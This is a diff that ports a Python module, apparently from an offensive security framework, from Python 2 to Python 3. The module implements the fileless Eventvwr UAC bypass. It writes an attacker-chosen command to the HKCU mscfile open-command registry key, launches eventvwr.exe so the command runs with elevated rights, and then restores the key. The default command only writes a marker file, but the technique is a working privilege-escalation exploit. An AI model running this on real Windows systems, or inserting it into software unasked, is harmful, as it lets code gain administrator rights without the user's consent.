@@ -7,12 +7,13 @@
 # Fileless - Eventvwr bypass UAC 
 
 
-from module import Module
-import psutil
-from termcolor import colored
-from support.winreg import Registry
-from _winreg import HKEY_CURRENT_USER as HKCU
-import os
+try:
+    from ...module import Module
+    from ...support.winreg import Registry
+except ImportError:
+    from module import Module
+    from support.winreg import Registry
+from winreg import HKEY_CURRENT_USER as HKCU
 
 class CustomModule(Module):
     def __init__(self):
@@ -21,7 +22,7 @@ class CustomModule(Module):
                        "Author": "Pablo Gonzalez"}
 
         # -----------name-----default_value--description
-        options = {"instruction": ["C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -C echo mola > c:\pwned.txt", "Elevated Code", True]
+        options = {"instruction": [r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -C echo mola > c:\pwned.txt", "Elevated Code", True]
                    }
 
         # Constructor of the parent class
@@ -33,17 +34,17 @@ class CustomModule(Module):
 
     # This module must be always implemented, it is called by the run option
     def run_module(self):
-        print "Creating hive..."
-        k = self.reg.create_key(HKCU,"Software\\Classes\\mscfile\\shell\\open\\command")
-        print "Created hive"
-        print "Setting 'Default'..."
-        self.reg.set_value(HKCU,"Software\\Classes\\mscfile\\shell\\open\\command", self.args["instruction"])
-        print "Done!"
-        print "Executing... eventvwr.exe"
+        print("Creating hive...")
+        k = self.reg.create_key(HKCU, "Software\\Classes\\mscfile\\shell\\open\\command")
+        print("Created hive")
+        print("Setting 'Default'...")
+        self.reg.set_value(HKCU, "Software\\Classes\\mscfile\\shell\\open\\command", self.args["instruction"])
+        print("Done!")
+        print("Executing... eventvwr.exe")
         self.run_binary("C:\\Windows\\System32\\eventvwr.exe")
-        print "Got it? :D"
-        print "Now... Deleting hive!"
+        print("Got it? :D")
+        print("Now... Deleting hive!")
         self.reg.restore(k)
-        print "Deleted!"
+        print("Deleted!")
 
 			
